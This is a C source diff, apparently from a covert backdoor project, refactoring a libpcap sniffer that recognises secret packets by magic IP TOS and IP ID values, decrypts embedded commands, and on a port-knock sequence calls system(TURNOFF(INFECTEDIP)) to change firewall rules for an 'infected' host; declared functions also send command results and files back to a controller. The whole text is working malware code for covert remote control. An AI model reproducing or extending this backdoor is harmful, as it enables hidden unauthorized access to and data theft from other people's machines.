@@ -24,11 +24,12 @@ struct payload{
 int Packetcapture();
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool knock);
+void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParsePayload(const u_char *payload, int len);
+void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
-bool CheckKey(u_char ip_tos, u_short ip_id);
+bool CheckKey(u_char ip_tos, u_short ip_id, bool type);
 void recv_results(char* sip, unsigned short sport);
 void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename);
 int rand_delay(int delay);
@@ -130,11 +131,11 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("Protocal: TCP\n");
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
-        if(CheckKey(ip->ip_tos, ip->ip_id)){
+        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
             printf("Reading payload\n");
-            ParseTCP(args, pkthdr, packet, false);
-        } else if(ip->ip_tos == 'b' && ip->ip_id == 'l') {
-            ParseTCP(args,pkthdr, packet, true);
+            ParseTCP(args, pkthdr, packet);
+        } else if(CheckKey(ip->ip_tos, ip->ip_id,true)) {
+            ParsePattern(args,pkthdr, packet);
         } else {
             printf("Packet tossed wrong key\n");
         }
@@ -142,15 +143,25 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
 
 }
 
-bool CheckKey(u_char ip_tos, u_short ip_id){
-    if(ip_tos == 'l' && ip_id == 'b'){
-        return true;
+bool CheckKey(u_char ip_tos, u_short ip_id, bool knock){
+    if(knock){
+        //check if the key is right for port knocking
+        if(ip_tos == 'b' && ip_id == 'l'){
+            return true;
+        } else {
+            return false;
+        }
     } else {
-        return false;
+        // check if key is right for normal packets
+        if(ip_tos == 'l' && ip_id == 'b'){
+            return true;
+        } else {
+            return false;
+        }
     }
 }
 
-void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool knock){
+void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     const struct sniff_tcp *tcp=0;
     const struct my_ip *ip;
     const char *payload;
@@ -179,12 +190,11 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
     size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 
     printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
-    if(knock){
-        for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
-            if(pattern[k] == tcp->th_dport){
-                knocking[k] = 1;
-            }
+    for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
+        if(pattern[k] == tcp->th_dport){
+            knocking[k] = 1;
         }
+    }
     if((knocking[0] == 1) && (knocking[1] == 1)){
         pcap_t* interfaceinfo;
 
@@ -197,11 +207,39 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
         system(TURNOFF(INFECTEDIP));
         pcap_breakloop(interfaceinfo);
     }
-    } else {
-        if(size_payload > 0){
-            printf("Payload (%d bytes):\n", size_payload);
-            ParsePayload(payload, size_payload);
-        }
+}
+
+void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+    const struct sniff_tcp *tcp=0;
+    const struct my_ip *ip;
+    const char *payload;
+
+    int size_ip;
+    int size_tcp;
+    int size_payload;
+
+    printf("TCP Packet\n");
+
+    ip = (struct my_ip*)(packet + 14);
+    size_ip = IP_HL(ip)*4;
+
+    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
+    size_tcp = TH_OFF(tcp)*4;
+
+    if(size_tcp < 20){
+        perror("TCP: Control packet length is incorrect");
+        exit(1);
+    }
+
+    printf("Source port: %d\n", ntohs(tcp->th_sport));
+    printf("Destination port: %d\n", ntohs(tcp->th_dport));
+    payload = (u_char *)(packet + 14 + size_ip + size_tcp);
+
+    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
+
+    if(size_payload > 0){
+        printf("Payload (%d bytes):\n", size_payload);
+        ParsePayload(payload, size_payload);
     }
 }
 
